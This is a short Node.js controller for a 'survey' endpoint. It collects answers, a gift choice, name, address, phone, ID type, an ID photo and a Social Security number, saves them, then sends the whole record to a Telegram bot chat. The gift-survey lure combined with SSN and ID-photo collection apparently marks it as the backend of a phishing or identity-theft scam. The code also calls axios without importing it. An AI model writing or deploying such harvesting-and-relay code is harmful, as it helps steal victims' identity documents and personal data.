import prisma from "../lib/prisma.js";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export const createSurvey = async (req, res) => {
  try {
    const {
      question1,
      question2,
      question3,
      question4,
      question5,
      gift,
      idType,
      address,
      photo,
      ssn,
      delivery,
      identity,
    } = req.body;

    const data = {
      answers: [question1, question2, question3, question4, question5, gift],
      licenseType: idType,
      fullName: address.name,
      address: address.address,
      state: address.state,
      city: address.city,
      zipcode: address.zipcode,
      phone: address.phone,
      photoUrl: photo,
      ssn,
      delivery,
      identity,
    };

    const survey = await prisma.survey.create({ data });

    // send tele
    sendTelegramNotification(`New Survey:\n\n${JSON.stringify(data, null, 2)}`);

    res.status(200).json(survey);
  } catch (error) {
    console.log(
      `Error: ${error.message}\nStack: ${error.stack.split("\n")[1]}`
    );

    res.status(500).json({ message: "Failed to create survey!" });
  }
};

async function sendTelegramNotification(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
    console.log("Notification sent to Telegram!");
  } catch (error) {
    console.error(
      "Failed to send notification:",
      error.response?.data || error.message
    );
  }
}
